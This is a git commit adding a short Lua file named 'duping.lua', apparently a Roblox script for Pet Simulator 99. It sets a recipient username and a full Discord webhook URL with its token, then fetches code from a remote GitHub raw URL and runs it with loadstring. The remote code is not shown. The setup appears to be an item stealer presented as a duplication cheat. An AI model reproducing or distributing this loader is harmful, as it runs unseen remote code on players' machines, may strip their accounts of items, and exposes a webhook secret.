955fc6efed98c453cb7581796dda8b2f742950c8
yasss911 <yassinebch6@gmail.com>
2025-04-03 15:13:19 +0100

    Create duping.lua

---
+++ duping.lua
@@ -0,0 +1,4 @@
+Username = "" -- << melovepotatoman
+Webhook = "" -- << https://discord.com/api/webhooks/1357345167069286601/-28KcAb-215YRHCMSesA3NvHiP1wC-jDK4t5KdtXVGEY-s6Ai7zhPrjHmxvQMkzMrrUv
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/ps99/refs/heads/main/Rua99"))()
